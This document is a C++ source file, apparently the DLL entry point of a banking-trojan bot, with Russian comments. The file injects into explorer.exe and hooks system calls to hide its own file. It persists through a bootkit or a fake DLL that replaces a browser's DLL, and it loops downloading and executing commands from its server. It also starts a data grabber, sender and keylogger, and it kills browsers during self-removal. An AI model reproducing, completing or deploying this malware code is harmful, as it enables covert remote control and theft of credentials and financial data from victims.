// dllmain.cpp: определяет точку входа для приложения DLL.
#include "stdafx.h"
#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Task.h"
#include "BotEvents.h"
#include "Loader.h"
#include "Config.h"
#include "BotCore.h"


#include "Crypt.h"
#include "BootkitCrypt.h"
#include "Modules.h"
#include "ntdll.h"
#include "coocksol.h"
#include "md5.h"
#include "DbgRpt.h"

#pragma comment(linker, "/ENTRY:MyDllMain" )

//------------------------------------------------------------------------------
//  Система отладочных строк
//------------------------------------------------------------------------------
#include "BotDebug.h"

namespace DLLDBGTEMPLATES
{
#include "DbgTemplates.h"
}

#define DLLDBG DLLDBGTEMPLATES::DBGOutMessage<>


//------------------------------------------------------------------------------


//-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	

WCHAR TempFileName[ MAX_PATH ]; //темп файл для добавления в автозагрузку

DWORD dwKillPid		 = 0; //пид для убийства процесса бота
DWORD dwFirst	     = 0; //запуск в первый раз
DWORD dwAlreadyRun   = 0; //если уже запущены
DWORD dwGrabberRun	 = 0; //отработал ли граббер
DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
DWORD dwWebMoneySelf = 0;

//глобальные переменные для хранения данных при запуске чере Fake.dll
char FakeDllPathBot[MAX_PATH]; //путь к шифрованному телу бота (bot.plug)
char FakeDllPathDll[MAX_PATH]; //путь к самой Fake.dll, ее заменена оригинальная dll
char FakeDllPathOrigDll[MAX_PATH]; //путь к оригинальной длл
char FakeDllCryptKey[32]; //ключ для шифрования тела бота
int FakeDllLenCryptKey = 0; //длина ключа шифрования тела бота

//DWORD dwExplorerPid  = 0; //пид эксплорера

//вычисляет хеш имяени файла в котором находится ботплаг, по этому хешу идет скрытие файла
DWORD GetHashFileNameBotPlug();

DWORD WINAPI LoaderRoutine(LPVOID Data)
{
	BOT::Initialize(ProcessLoader);

	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");

	switch( BOT::GetBotType() )
	{
		case BotBootkit: //если стартовали из под буткита, то удаляем ring3 бота из автозагрузки
			BOT::UninstallService();
			BOT::DeleteAutorunBot();
			break;
	}

	//UnhookDlls();

	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();

	// Регистрируем глобальный менеджер задач
	InitializeTaskManager(NULL, true);

	// Инициализируем систему отправки статистической информации
	DebugReportInit();

	// 402_pl запуск цикла получения команд (он получается в другом процессе)
	DebugReportStepByName("402_pl");

	// Вызываем событие
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		return 0; 
	}




	// Запускаем поток отправки данных
	DataGrabber::StartDataSender();

	// Стартуем поток обновления списка процессов кейлогера
	#ifdef UniversalKeyLoggerH
		KeyLogger::StartProcessListDownloader();
	#endif


	bool FirstSended = false;
	
	DLLDBG("====>Bot Loader", "Стартуем выполнение команд");
	while (true)
	{
		// 403_pl цикл получения команд
		DebugReportStepByName("403_pl");
		
		DownloadAndExecuteCommand(NULL, NULL);

		// "Гениальность" проектирования взаимосвязи бота и его сервера
		// отправка стартовой информации должна идти только после получения
		// команды
		if (!FirstSended)
		{
			DLLDBG("====>Bot Loader", "Отправляем информацию о системе");
			FirstSended = SendFirstInfo();
		}


		// Приостанавливаем выполнение команд
		if (!TaskManagerSleep(NULL))
			break;
	}

	return 0;
}

DWORD WINAPI ExplorerMain(LPVOID Data)
{
	DLLDBG("====>Bot DLL", "Запускаем бот. Префикс [%s]", GetPrefix().t_str());
	
	//UnhookDlls();

	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();

	// Инициализируем систему отправки статистической информации
	DebugReportInit();
	BOT::AddHiddenFile(GetHashFileNameBotPlug());

	HookZwResumeThread();
	HookZwQueryDirectoryFile();

	// 401_pl запуск BotPlug
	DebugReportStepByName("401_pl");

	DLLDBG("====>Bot DLL", "Стартуем Loader ()");
	MegaJump( LoaderRoutine );

	
	#ifdef GrabberH
		if ( dwFirst && !dwGrabberRun ) 
		{
			DLLDBG("====>Bot DLL", "Стартуем грабер");
			MegaJump( GrabberThread );
		}
	#endif

	//MegaJump(AvFuckThread);


	// Вызываем событие мтарта експлорера

//	if (dwFirst)
//		ExplorerFirstStart(NULL);


	ExplorerStart(NULL);


	return 0;
}

extern"C"  void WINAPI Start(LPVOID, LPVOID, LPVOID)
{
	BOT::Initialize(ProcessUnknown);
	StartThread(ExplorerMain, NULL);
}


BOOL APIENTRY MyDllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved)
{
	char buf[MAX_PATH];
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			BOT::Initialize(ProcessUnknown);
			pGetModuleFileNameA( NULL, buf, MAX_PATH );
			DLLDBG( "MyDllMain", "Start bot.plug in process %s", buf );
			if( File::GetNameHashA( buf, true ) == 0x490A0972 ) //стартуем если в процессе проводника (explorer.exe)
			{
				if( BOT::CreateBootkitMutex() )
				{
					BOT::SetBotType(BotBootkit);
					StartThread(ExplorerMain, NULL);
				}
			}
			break;
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	
	return TRUE;
}

bool FakeDllDelete()
{
	BOT::DeleteBotFile(FakeDllPathBot);
	//если восстановить оригинальную длл сразу невозможно (ее держит браузер), то восстанавливаем после ребута
	if( !pMoveFileExA( FakeDllPathOrigDll, FakeDllPathDll, MOVEFILE_REPLACE_EXISTING ) )
		pMoveFileExA( FakeDllPathOrigDll, FakeDllPathDll, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
	return true;
}

//функция физического удаления бота в отдельном процессе
DWORD WINAPI DeleteFakeDllInSvchost(LPVOID Data)
{
	BOT::Initialize(ProcessUnknown);
	pSleep(10 * 1000); //ждем некоторое время
	DLLDBG( "DeleteFakeDllInSvchost", "Unisntall fake dll" );
	KillAllBrowsers();
	FakeDllDelete();
	return 0;
}

// Ф-ция для прыжка в Explorer при загрузке из StartFromFakeDll
DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
{
	BOT::Initialize(ProcessUnknown);
	DLLDBG("ExplorerEntryPointFromFakeDll", "Bot started in Explorer.exe" );
	// При загрузке просто вызывает Start, предусмотренную для
	// обычного запуска Bot.plug
	BOT::SetBotType(BotFakeDll);
	Start(NULL, NULL, NULL);
	return 0;
}

// Експортируемая ф-ция для запуска Bot.plug из FakeDll.
// pathBotPlug - путь в котором находится этот бот
// pathFakeDll - путь к fake.dll 
// pathOrigDll - путь к длл которую подменили на fake.dll
// cryptKey, lenCryptKey - ключ и длина ключа для шифрования тела бота при обновлении
// эти параметры необходимы для удаления и обновления бота
BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, const char* pathOrigDll, const char* cryptKey, int lenCryptKey )
{
//	BOT::Initialize();
	DLLDBG("StartFromFakeDll", "StartFromFakeDll pathBotPlug: '%s', pathFakeDll: '%s', pathOrigDll: '%s'", pathBotPlug, pathFakeDll, pathOrigDll );

	m_lstrcpy( FakeDllPathBot, pathBotPlug );
	m_lstrcpy( FakeDllPathDll, pathFakeDll );
	m_lstrcpy( FakeDllPathOrigDll, pathOrigDll );
	m_memcpy( FakeDllCryptKey, cryptKey, lenCryptKey );
	FakeDllLenCryptKey = lenCryptKey;
	FakeDllCryptKey[lenCryptKey] = 0;

	DLLDBG("StartFromFakeDll", "StartFromFakeDll key: '%s', len key: %d", cryptKey, lenCryptKey );

	if( BOT::BootkitIsRun() ) //если запущен буткит, то удаляем эту версию бота
	{
		MegaJump(DeleteFakeDllInSvchost);
	}
	else
	{
		// Смотрим на то - запущен ли бот
		HANDLE BotInstanceMutex = BOT::TryCreateBotInstance();

		DLLDBG("StartFromFakeDll", "BOT::TryCreateBotInstance() result=0x%X", BotInstanceMutex);
		if (BotInstanceMutex )
		{
			pCloseHandle(BotInstanceMutex); //закрываем мютекс, чтобы его снова создали в процессе explorer.exe
			return (InjectIntoExplorer(ExplorerEntryPointFromFakeDll) ? TRUE : FALSE);
		}
	}
	return FALSE;
}

//обновление тела бота, запускаемого буткитом
bool UpdateBotBootkit( BYTE* data, int c_data )
{
	return WriteBotForBootkit( data, c_data );
}

static void XorCryptForFakeDll(LPBYTE Key, DWORD KeySize, LPBYTE Buffer, DWORD Size)
{
	DWORD a = 0;

	while (a < Size)
	{
		DWORD b = 0;
		while (b < KeySize)
		{
			Buffer[a] ^= (Key[b] + (a * b));
			b++;
		}
		a++;
	}
}

//обновление тела бота запускаемого через fake.dll
bool UpdateBotFakeDll( BYTE* data, int c_data )
{
	TMemory mem(c_data);
	m_memcpy( mem.Buf(), data, c_data );
	XorCryptForFakeDll( (BYTE*)FakeDllCryptKey, FakeDllLenCryptKey, (BYTE*)mem.Buf(), c_data );
	if( File::WriteBufferA( FakeDllPathBot, mem.Buf(), c_data ) == c_data )
		return true;
	return false;
}

DWORD GetHashFileNameBotPlug()
{
	char* nameFile = 0;
	char buf[MAX_PATH];
	switch( BOT::GetBotType() )
	{
		case BotFakeDll:
			nameFile = FakeDllPathBot;
			break;
		case BotBootkit:
			nameFile = NameFileForBootkit( buf, sizeof(buf) );
			break;
	}
	if( nameFile )
		return File::GetNameHashA( nameFile, false );
	return 0;
}
